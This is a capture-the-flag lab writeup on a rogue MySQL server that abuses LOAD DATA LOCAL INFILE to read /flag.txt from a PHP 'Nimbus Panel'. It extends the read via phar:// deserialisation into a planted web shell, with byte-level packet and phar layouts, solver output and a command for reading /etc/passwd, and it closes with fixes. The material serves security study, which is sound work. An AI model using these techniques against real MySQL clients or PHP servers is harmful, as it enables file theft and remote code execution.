# 19 — Nimbus Panel: the MySQL server that reads *your* files — Writeup

## TL;DR

`LOAD DATA LOCAL INFILE` is initiated by the **server**. A MySQL client with
local-infile enabled will answer a `0xFB` "send me this file" packet — sent in
reply to *any* query — by uploading a file from its own disk. The Nimbus Panel
lets you choose which server it connects to and enables local-infile for its
importer, so a ~200-line rogue MySQL server reads `/flag.txt` out of the web
server. Answer with a `phar://` path instead and the client parses the phar,
`unserialize()`s the attacker-controlled metadata, and a `DebugLogger`
`__destruct` gadget drops a web shell — full RCE.

Flag: `PHRACK{the_mysql_server_decides_which_file_you_upload}`

## The bug

### The app

- **Image:** `php:7.4.33-apache` (Debian 11), mod_php, `mysqli` on the bundled
  **mysqlnd** driver (no `libmysqlclient`).
- **ini:** `mysqli.allow_local_infile = On` (for the nightly `LOAD DATA LOCAL
  INFILE` importer).
- The "health check" (`challenge/src/index.php`):

  ```php
  $mysqli = mysqli_init();
  mysqli_options($mysqli, MYSQLI_OPT_LOCAL_INFILE, true);   // <-- the flaw
  mysqli_real_connect($mysqli, $host, $user, $pass, $name, (int)$port);
  $res = mysqli_query($mysqli, 'SELECT VERSION() AS version');  // gives the server its turn
  ```

Host, port, user, password and db all come from the operator. The flag is at
`/flag.txt` (root-owned, mode 0644) and is not served by Apache.

### Why this is exploitable

`LOAD DATA LOCAL INFILE 'x'` normally means "*client*, read local file `x` and
stream it to the server". The protocol implements that by having the **server**
send the client a packet whose first byte is `0xFB` followed by a filename; the
client then streams that file back. Nothing in the wire protocol ties that
packet to a query the client issued — the server may send it in response to
*any* command. A malicious server therefore answers `SELECT VERSION()` with
`0xFB/flag.txt`, and a client with local-infile enabled uploads `/flag.txt`.

mysqlnd's default handler (`ext/mysqlnd/mysqlnd_loaddata.c`) makes this worse
than a plain file read:

```c
info->fd = php_stream_open_wrapper_ex((char *)filename, "r", 0, NULL, context);
```

The filename goes straight into `php_stream_open_wrapper_ex` — so **any PHP
stream wrapper** works, including `phar://`. That is the LoRexxar/Dawu chain
extension.

## The MySQL protocol, byte by byte

`solve/rogue.py` implements protocol version 10. Every packet is:

```
+--------------------------+----------+-------------------------+
| payload length (3 bytes) | seq (1)  | payload (length bytes)  |
| little-endian            |          |                         |
+--------------------------+----------+-------------------------+
```

The sequence id starts at 0 for the greeting and increments on each packet
within a command exchange; the client mirrors it. The full exchange:

```
server -> Initial Handshake Packet         seq 0
client -> HandshakeResponse41              seq 1   (credentials — ignored)
server -> OK                               seq 2
client -> COM_QUERY "SELECT VERSION()"     seq 0   (new command, seq resets)
server -> 0xFB + "/flag.txt"               seq 1   <-- LOCAL INFILE request
client -> <file bytes>                     seq 2   (one or more packets)
client -> <empty packet>                   seq 3   <-- end of upload
server -> OK                               seq 4
```

### 1. Initial Handshake Packet (server → client)

```
0a                        protocol version 10
"5.7.44-…" 00             server version, NUL-terminated
01 00 00 00               connection id (u32 LE)
31 32 33 34 35 36 37 38   auth-plugin-data part 1 (8 bytes of scramble)
00                        filler
<caps low u16 LE>         lower 16 capability bits
21                        default collation (0x21 = utf8_general_ci)
02 00                     status flags (SERVER_STATUS_AUTOCOMMIT)
<caps high u16 LE>        upper 16 capability bits
15                        length of auth-plugin-data (=21)
00 * 10                   reserved
41 … 4c 00                auth-plugin-data part 2 (12 bytes) + NUL
"mysql_native_password"00 auth plugin name
```

The capability bits that matter: `CLIENT_PROTOCOL_41` (0x200) so the client
uses the 4.1 auth/OK layout, and `CLIENT_LOCAL_FILES` (0x80) to advertise that
we may ask for local files.

### 2. HandshakeResponse41 (client → server)

We do not authenticate anyone, so we only glance at it: the first 32 bytes are
`client caps (u32) | max packet (u32) | charset (1) | 23 reserved`, then a
NUL-terminated username. `rogue.py` logs the username and replies OK regardless
of the password — a real attacker's rogue server accepts everything.

### 3. OK packet (server → client)

```
00           header (0x00 = OK)
00           affected_rows  (length-encoded int, 0)
00           last_insert_id (length-encoded int, 0)
02 00        status flags
00 00        warnings
```

### 4. The LOCAL INFILE request — the actual exploit (server → client)

```
fb           header 0xFB (251) = "LOCAL INFILE request"
2f 66 6c 61… the rest of the payload is the filename: "/flag.txt"
```

That is the entire trick: one byte, then the path we want. The client answers
with the file contents split across normal packets, terminated by a zero-length
packet — `rogue.py` concatenates them and prints the file.

### Running it

Captured live by `verify.sh`:

```
[rogue] handshake response: 94 bytes (seq 1); user='healthcheck' - accepting blindly
[rogue] COM_QUERY 'SELECT VERSION() AS version'
[rogue] answering with LOCAL INFILE request -> /flag.txt
[rogue] client sent 55 bytes for /flag.txt
    captured 55 bytes of /flag.txt: 'PHRACK{the_mysql_server_decides_which_file_you_upload}'
```

## The exploit

`solve/solve.py` (Python 3 stdlib only) imports `rogue.py`, starts the rogue
server on a background thread, discovers the address the challenge container can
reach it on, and POSTs the health-check form pointed at itself.

- **stage 1** — request `/flag.txt`; scrape `PHRACK{…}` from the upload. This is
  what `verify.sh` asserts.
- **stage 2** — the phar chain (below).

```sh
$ make solve
[1] asking the panel to 'health check' our rogue server
    captured 55 bytes of /flag.txt: 'PHRACK{the_mysql_server_decides_which_file_you_upload}'
...
FLAG: PHRACK{the_mysql_server_decides_which_file_you_upload}
```

### Running the rogue server by hand

`make up` also exposes the rogue server on `127.0.0.1:9019`. From the web UI put
your host IP and port `9019` into the form. Or run it straight on the host
(needs only Python 3) and request a different file:

```sh
python3 solve/rogue.py --bind 0.0.0.0:3306 --file /etc/passwd
# then point the panel at your address:3306
```

## Chain extension: `phar://` deserialisation → RCE (stage 2, verified)

Because mysqlnd opens the infile name through `php_stream_open_wrapper_ex`, we
can answer with a `phar://` URL. Opening a phar forces PHP to parse its manifest
and, crucially, to `unserialize()` the archive **metadata**
(`phar_parse_metadata` in `ext/phar/phar.c` calls `php_var_unserialize`
eagerly). If we control an object whose class has a useful `__destruct`, we get
code execution when that object is torn down at request shutdown.

The app hands us a gadget on a plate — `challenge/src/lib.php`:

```php
class DebugLogger {
    public $logfile; public $buffer = '';
    function __destruct() {
        if ($this->buffer !== '')
            file_put_contents($this->logfile, $this->buffer, FILE_APPEND);
    }
}
```

Set `logfile` to a path under `uploads/` ending in `.php` and `buffer` to a PHP
web shell, and its destructor writes the shell to disk.

Two problems to solve, both handled by `solve.py`:

1. **Get the phar into the container.** The panel's "operator avatar" upload
   renames anything to `uploads/<sha1>.png` — it never checks the content, and
   phar does not care about the extension. We prepend an `\x89PNG\r\n\x1a\n`
   magic so it also looks like an image. (`.png` also stops Apache executing it
   directly — but we do not need it to; the phar wrapper reads it by absolute
   path.)

2. **Build a valid phar by hand.** `solve.py:build_phar()` assembles it. The
   fields that bite:
   - The 2-byte **API version is big-endian** (`phar.c` reads it as
     `buffer[0]<<8 | buffer[1]`), value `0x1110`. *Every other* multi-byte field
     (manifest length, file count, flags, alias length, metadata length, CRC,
     sizes) is **little-endian**.
   - Global flag `0x00010000` marks the archive as signed, and
     `phar.require_hash` is On by default, so a **SHA-1 trailer is mandatory**:
     `… <20-byte SHA1 of everything before it> <u32 0x0002> "GBMB"`.
   - The metadata length/blob directly precedes the file entries; the blob is
     the `serialize()` of our `DebugLogger`.

The layout `build_phar()` emits:

```
\x89PNG\r\n\x1a\n <?php __HALT_COMPILER(); ?>\r\n     (stub, must contain the halt)
<manifest length u32 LE>
  <file count u32 LE = 1>
  <api version = 11 10>          (BE!)
  <global flags u32 LE = 00 00 01 00>   (signed)
  <alias length u32 LE = 0>
  <metadata length u32 LE><O:11:"DebugLogger":2:{…}>   <-- unserialize target
  <entry: name len, "a.txt", sizes, mtime, CRC32, mode flags, per-file meta len>
<file data "x">
<SHA1(all of the above) : 20 bytes><u32 0x0002 = SHA1><"GBMB">
```

Then the second rogue exchange answers `SELECT VERSION()` with
`phar:///var/www/html/uploads/<sha1>.png/a.txt`. The manifest parse
deserialises the gadget; at request shutdown `DebugLogger::__destruct` writes
`uploads/pwn.php`; the solver requests it:

```
[rogue] answering with LOCAL INFILE request -> phar:///var/www/html/uploads/…​.png/a.txt
    webshell says: uid=33(www-data) gid=33(www-data) … PHRACK{the_mysql_server_decides_which_file_you_upload}
```

**Verified end to end on `php:7.4.33-apache`.** The destructor fires during PHP
request shutdown (after the response is generated), so the solver waits ~1s
before hitting the shell.

### Note on the article's other reference [90]

cfreal's bug (`bugs.php.net/bug.php?id=81719`) is a *memory-corruption* RCE: a
malicious server sends an over-long field that overflows a stack buffer in
mysqlnd/PDO's password handling. That is a heap/stack-grooming exploit tied to
specific unpatched PHP builds and is **not** reproduced here — the patched
`php:7.4.33` used by this lab is not vulnerable, and a reliable memory-safety
exploit is out of scope for a wire-protocol lab. This lab covers the file-read
primitive ([91]) that both references build on, plus the phar chain extension.

## Fixing it

1. **Disable local-infile on clients that connect to untrusted servers.** Do
   not set `MYSQLI_OPT_LOCAL_INFILE = true`; set `mysqli.allow_local_infile =
   Off` (it is Off by default on PHP ≥ 8.1). For PDO,
   `PDO::MYSQL_ATTR_LOCAL_INFILE => false`. The nightly importer should use a
   dedicated connection with the option scoped to it, never the health-check.
2. **Do not let users pick the database host.** An admin "test connection"
   feature is remote-server-controlled input; whitelist known hosts.
3. **Never expose an `unserialize()` sink to attacker-controlled paths.** Keep
   `phar.readonly = On` (it is) *and* avoid opening attacker-influenced paths
   with stream wrappers; PHP 8.0 removed automatic phar metadata unserialisation
   for most functions, but the local-infile path still opens raw stream URLs.
4. Store uploads outside the web root, validate content type, and never trust a
   renamed extension to neuter a file — phar reads by path, not by name.

## Going further

- **Other clients, same bug.** Any local-infile-enabled MySQL client is a
  target: `mysql` CLI (`--local-infile=1`), JDBC (`allowLoadLocalInfile`),
  Python's `PyMySQL`/`mysqlclient` with `local_infile=1`, Go, etc. The rogue
  server here is client-agnostic.
- **Blind file read.** Even without a UI that echoes the file, you exfiltrate to
  the rogue server directly — it never has to show the client anything.
- **Chaining wrappers.** `php://filter/convert.base64-encode/resource=…` as the
  infile name base64s the file in transit; `compress.zlib://` etc. also resolve.
- **The memory-corruption path [90].** On a vulnerable PHP, the same "malicious
  server" position lets you corrupt mysqlnd's heap for RCE on the *client* — a
  much deeper exploit than the file read, and the reason Orange lists MySQL
  client-side attacks as a whole category.

## References

- Orange Tsai, "The Art of PHP — My CTF Journey and Untold Stories!", Phrack
  #72, *Honorable Mention*.
- LoRexxar & Dawu (Knownsec 404), *MySQL Client Arbitrary File Reading Attack
  Chain Extension*:
  <https://medium.com/@knownsec404team/mysql-client-arbitrary-file-reading-attack-chain-extension-727bb63f578c>
- Charles "cfreal" Fol, mysqlnd/PDO password buffer overflow (bug #81719):
  <https://bugs.php.net/bug.php?id=81719>
- MySQL client/server protocol (packet layout, `COM_QUERY`, LOCAL INFILE
  request): <https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_basics.html>
- `php-src/ext/mysqlnd/mysqlnd_loaddata.c` (the `php_stream_open_wrapper_ex`
  call) and `php-src/ext/phar/phar.c` (`phar_parse_metadata`).
